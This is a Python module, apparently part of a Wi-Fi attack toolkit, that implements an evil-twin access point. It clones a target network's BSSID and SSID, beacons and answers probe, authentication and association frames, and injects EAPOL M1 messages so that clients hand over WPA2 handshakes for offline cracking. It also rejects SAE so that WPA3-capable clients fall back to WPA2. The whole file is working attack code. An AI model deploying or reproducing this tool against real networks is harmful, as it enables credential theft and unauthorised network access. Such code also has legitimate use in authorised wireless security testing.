"""FakeAP: the WPA2 twin's beacon + responder + per-client state (mechanism only, no UI/log).

Owns the decoy-channel interface: arms active-monitor on the cloned BSSID, beacons the WPA2 twin,
answers probe/auth/assoc, and crafts + injects M1 with a fresh per-client ANonce. It emits nothing
to the UI. The campaign polls ``stats`` for the activity log and reads the sink for the
crackable-handshake stop condition. Each M1 is passed to ``record_m1`` (the campaign seeds the sink)
*before* it is injected, so an immediate M2 already has its donor.
"""
from __future__ import annotations

import asyncio
import enum
import logging
import os
import struct
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, Optional

from wifit3.dot11 import build_deauth
from wifit3.dot11.ap import auth_resp, assoc_resp, eapol_m1
from wifit3.dot11.mac import mac_to_str
from wifit3.dot11.ie import iter_information_elements

logger = logging.getLogger(__name__)

_BEACON_PERIOD_S = 100 * 1024 / 1_000_000       # 100 TU
_BEACON_BODY = 36                               # 24B MAC header + timestamp, interval, capability
_ELEMID_TIM = 5                                 # beacon-only: a probe response omits it
_SAE_AKMS = frozenset({8, 9, 24, 25})           # SAE / FT-SAE / SAE-EXT-KEY / FT-SAE-EXT-KEY
_STATUS_INVALID_PMKID = 53
_STATUS_NOT_SUPPORTED_AUTH_ALG = 13
_AUTH_ALG_SAE = 3
_EAPOL_KEY_TIMEOUT_FIRST_S = 0.1                # hostapd wpa_auth.c eapol_key_timeout_first
_EAPOL_KEY_TIMEOUT_SUBSEQ_S = 1.0               # hostapd wpa_auth.c eapol_key_timeout_subseq
_WPA_PAIRWISE_UPDATE_COUNT = 4                  # hostapd ap_config.c: M1 sends per 4-way


class ClientPhase(enum.IntEnum):
    AUTHED = 1
    ASSOCED = 2
    GOT_M2 = 3


@dataclass
class ClientProgress:
    phase: ClientPhase
    anonce: bytes = b""
    replay: int = 1
    first_seen: float = 0.0
    last_advance: float = 0.0


@dataclass
class FakeApStats:
    probes_direct: int = 0
    probes_wildcard: int = 0
    auth: int = 0
    assoc: int = 0
    m2: int = 0
    strays: int = 0                                 # deauths sent for data from unassociated STAs
    cached_key_rejects: int = 0                     # SAE assoc-reqs refused with status 53
    sae_auth_rejects: int = 0                       # SAE auths refused with status 13
    clients: Dict[str, ClientProgress] = field(default_factory=dict)


class FakeAP:
    def __init__(self, twin_iface, bssid: bytes, ssid: str, channel: int, twin_beacon: bytes,
                 rx_source=None, record_m1: Optional[Callable[[bytes], None]] = None):
        self.iface = twin_iface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.twin_beacon = twin_beacon
        self.rx_source = rx_source
        self.record_m1 = record_m1 or (lambda _frame: None)
        self.stats = FakeApStats()
        self._probe_resp = self._probe_resp_from(twin_beacon)
        self._running = False
        self._fake_mac_armed = False
        self._rx_registered = False
        self._beacon_task: Optional[asyncio.Task] = None
        self._m1_tasks: Dict[str, asyncio.Task] = {}

    # ----- lifecycle ---------------------------------------------------------

    async def start(self) -> None:
        if self.iface.current_channel != self.channel:
            await self.iface.set_channel(self.channel)
        armed_mac = await self.iface.set_fake_mac(self.bssid, self.bssid)
        self._fake_mac_armed = armed_mac is not None
        if self.rx_source is not None:
            self.rx_source.register_rx_callback(self.on_rx)
            self._rx_registered = True
        self._running = True
        self._beacon_task = asyncio.create_task(self._beacon_loop())

    async def stop(self) -> None:
        """Idempotent teardown: drop the RX hook, reap the beacon and M1 tasks,
        clear the fake MAC."""
        self._running = False
        error = None
        if self._rx_registered:
            self._rx_registered = False
            try:
                self.rx_source.unregister_rx_callback(self.on_rx)
            except Exception as exc:
                error = exc
        tasks = list(self._m1_tasks.values())
        self._m1_tasks.clear()
        beacon_task, self._beacon_task = self._beacon_task, None
        if beacon_task is not None:
            tasks.append(beacon_task)
        for task in tasks:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            except Exception as exc:
                error = error or exc
        if self._fake_mac_armed:
            self._fake_mac_armed = False
            try:
                await self.iface.clear_fake_mac()
            except Exception as exc:
                error = error or exc
        if error is not None:
            raise error

    async def _beacon_loop(self) -> None:
        failing = False
        while self._running:
            try:
                await self.iface.send_no_wait(self._restamp(self.twin_beacon))
                failing = False
            except Exception:
                if not failing:            # one log per run of failures, not 10/s
                    logger.exception("FakeAP beacon send failed; still beaconing")
                failing = True
            await asyncio.sleep(_BEACON_PERIOD_S)

    @staticmethod
    def _probe_resp_from(beacon: bytes) -> bytes:
        """The twin beacon as a probe response, so both advertise the same network: same fixed
        fields and elements minus the TIM. Addr1 is zeroed; the client is spliced in per probe."""
        elements = b"".join(raw for tag, _body, raw in iter_information_elements(beacon, _BEACON_BODY)
                            if tag != _ELEMID_TIM)
        return b"\x50\x00" + beacon[2:4] + b"\x00" * 6 + beacon[10:_BEACON_BODY] + elements

    @staticmethod
    def _restamp(beacon: bytes) -> bytes:
        return beacon[:24] + struct.pack("<Q", int(time.time() * 1_000_000)) + beacon[32:]

    # ----- responder (sync; injects via _tx) ---------------------------------

    def on_rx(self, pkt) -> None:
        raw = pkt.raw
        if len(raw) < 24:
            return
        client = raw[10:16]
        if pkt.type == "eapol":
            if raw[4:10] == self.bssid:                 # an M2 to us, not the real AP on this channel
                self._on_m2(pkt, client)
            return
        if pkt.type_id == 2:                            # a data frame to us from a STA not associated
            if pkt.to_ds and raw[4:10] == self.bssid and not self._associated(client):
                self._on_stray_data(client)
            return
        if pkt.type_id != 0:
            return
        subtype = pkt.subtype_id
        if subtype == 0x04:                             # probe request
            self._on_probe(pkt, client)
        elif raw[4:10] != self.bssid:                   # auth/assoc must be addressed to us
            return
        elif subtype == 0x0B:                           # authentication
            self._on_auth(raw, client)
        elif subtype in (0x00, 0x02):                   # (re)association request
            self._on_assoc(pkt, client)

    def _associated(self, client: bytes) -> bool:
        rec = self.stats.clients.get(mac_to_str(client))
        return rec is not None and rec.phase >= ClientPhase.ASSOCED

    def _on_stray_data(self, client: bytes) -> None:
        """Deauth every data frame from a STA not associated with us, reason 7 (class-3 frame from a
        nonassociated STA), as hostapd does."""
        self.stats.strays += 1
        self._tx(build_deauth(client, self.bssid, self.bssid, 7))

    def _on_probe(self, pkt, client: bytes) -> None:
        ssid = getattr(pkt, "ssid", None)
        if ssid in (None, "", "<hidden>"):
            self.stats.probes_wildcard += 1
        elif ssid == self.ssid:
            self.stats.probes_direct += 1
        else:
            return
        self._tx(self._restamp(self._probe_resp[:4] + client + self._probe_resp[10:]))

    def _on_auth(self, raw: bytes, client: bytes) -> None:
        self.stats.auth += 1
        self._cancel_m1(mac_to_str(client))
        if int.from_bytes(raw[24:26], "little") == _AUTH_ALG_SAE:
            # Refuse SAE as an AP without it does (hostapd: sequence 2, status 13).
            self.stats.sae_auth_rejects += 1
            self._tx(auth_resp(self.bssid, client, algorithm=_AUTH_ALG_SAE,
                               status=_STATUS_NOT_SUPPORTED_AUTH_ALG))
            return
        self._advance(mac_to_str(client), ClientPhase.AUTHED)
        self._tx(auth_resp(self.bssid, client))

    def _on_assoc(self, pkt, client: bytes) -> None:
        self.stats.assoc += 1
        cs = mac_to_str(client)
        self._cancel_m1(cs)
        reassoc = pkt.subtype_id == 0x02
        if getattr(pkt, "assoc_akm", None) in _SAE_AKMS:
            # SAE after our open auth means a cached SAE key we don't hold: refuse it, as hostapd does.
            self.stats.cached_key_rejects += 1
            self._tx(assoc_resp(self.bssid, client, channel=self.channel, status=_STATUS_INVALID_PMKID,
                                reassoc=reassoc, twin_beacon=self.twin_beacon))
            return
        self._advance(cs, ClientPhase.ASSOCED)
        anonce = os.urandom(32)
        rec = self.stats.clients[cs]
        rec.anonce, rec.replay = anonce, 1
        m1 = eapol_m1(self.bssid, client, anonce, replay=1)
        self.record_m1(m1)
        response = assoc_resp(self.bssid, client, channel=self.channel, reassoc=reassoc,
                              twin_beacon=self.twin_beacon)
        self._m1_tasks[cs] = asyncio.create_task(self._send_m1(client, rec, (response, m1)))

    async def _send_m1(self, client: bytes, rec: ClientProgress, first_frames: tuple[bytes, ...]) -> None:
        """Send the (re)assoc response and M1, then resend M1 until an M2 cancels this, as hostapd
        does: same ANonce, replay counter + 1."""
        await self._send_in_order(first_frames)
        for send in range(2, _WPA_PAIRWISE_UPDATE_COUNT + 1):
            await asyncio.sleep(_EAPOL_KEY_TIMEOUT_FIRST_S if send == 2 else _EAPOL_KEY_TIMEOUT_SUBSEQ_S)
            rec.replay += 1
            m1 = eapol_m1(self.bssid, client, rec.anonce, replay=rec.replay)
            self.record_m1(m1)
            await self.iface.send_no_wait(m1)
        self._m1_tasks.pop(mac_to_str(client), None)

    def _cancel_m1(self, client: str) -> None:
        task = self._m1_tasks.pop(client, None)
        if task is not None:
            task.cancel()

    def _on_m2(self, pkt, client: bytes) -> None:
        if getattr(pkt, "msg_num", 0) != 2:
            return
        cs = mac_to_str(client)
        self._cancel_m1(cs)
        rec = self.stats.clients.get(cs)
        if rec is not None and rec.phase >= ClientPhase.GOT_M2:
            return
        self.stats.m2 += 1
        self._advance(cs, ClientPhase.GOT_M2)

    def _advance(self, client: str, phase: ClientPhase) -> None:
        rec = self.stats.clients.get(client)
        now = time.time()
        if rec is None:
            self.stats.clients[client] = ClientProgress(phase=phase, first_seen=now, last_advance=now)
        elif phase > rec.phase:
            rec.phase = phase
            rec.last_advance = now

    def _tx(self, *frames: bytes) -> None:
        """Inject ``frames`` in order, each handed to the driver before the next."""
        asyncio.create_task(self._send_in_order(frames))

    async def _send_in_order(self, frames: tuple[bytes, ...]) -> None:
        for frame in frames:
            await self.iface.send_no_wait(frame)
